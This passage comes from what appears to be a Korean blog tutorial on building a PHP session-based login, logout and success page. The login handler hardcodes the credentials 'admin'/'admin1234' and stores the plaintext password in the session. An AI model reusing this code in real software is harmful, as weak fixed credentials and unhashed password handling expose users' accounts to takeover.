                    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"btn"</span> <span class="na">onclick=</span><span class="s">"location.href='logout.php'"</span><span class="nt">&gt;</span>Logout<span class="nt">&lt;/button&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>  
    <span class="nt">&lt;/body&gt;</span>
    <span class="nt">&lt;/html&gt;</span>
<span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<p><br /></p>

<h3 id="112-로그인-성공유무로-url-이동성공-로그인성공시화면-실패-초기화면에서-경고문">1.1.2 로그인 성공유무로 url 이동<span style="font-size:50%">(성공: 로그인성공시화면, 실패: 초기화면에서 경고문)</span></h3>

<p><br /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="c1">##초기화면에서 작성한 아이디와 비밀번호를 변수로 지정함.</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Password'</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
	
	<span class="c1">## 만약 해당 아이디와 비밀번호가 맞을경우, 틀릴경우 각각 url이동 </span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">]</span><span class="o">==</span><span class="s2">"admin"</span><span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Password'</span><span class="p">]</span><span class="o">==</span><span class="s2">"admin1234"</span><span class="p">){</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login_success.php'</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild login name or password'</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><br /></p>

<h3 id="113-로그아웃-클릭시-세션끝내고-초기화면">1.1.3 로그아웃 클릭시 세션끝내고 초기화면</h3>

<p><br /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nb">session_unset</span><span class="p">();</span>  <span class="c1">#모든 session변수 등록 해제</span>
<span class="nb">session_destroy</span><span class="p">();</span> <span class="c1">#세션종료, 세션파일, 브라우저 쿠키삭제</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php'</span><span class="p">);</span> <span class="c1">#
</span></code></pre></div></div>]]></content><author><name>ethan</name></author><category term="project" /><summary type="html"><![CDATA[]]></summary></entry></feed>